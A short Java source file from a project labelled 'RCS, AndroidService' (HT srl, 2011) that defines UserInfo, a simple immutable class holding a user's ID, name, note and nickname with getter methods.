/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : UserInfo.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module.task;

public class UserInfo {
	private static final String TAG = "UserInfo"; //$NON-NLS-1$

	private final String completeName, userNote, userNickname;
	private final long userId;

	public UserInfo(long userId, String userName, String userNote, String userNickname) {
		this.userId = userId;
		this.completeName = userName;
		this.userNote = userNote;
		this.userNickname = userNickname;
	}

	public String getCompleteName() {
		return completeName;
	}

	public String getUserNote() {
		return userNote;
	}

	public String getUserNickname() {
		return userNickname;
	}

	public long getUserId() {
		return userId;
	}
}
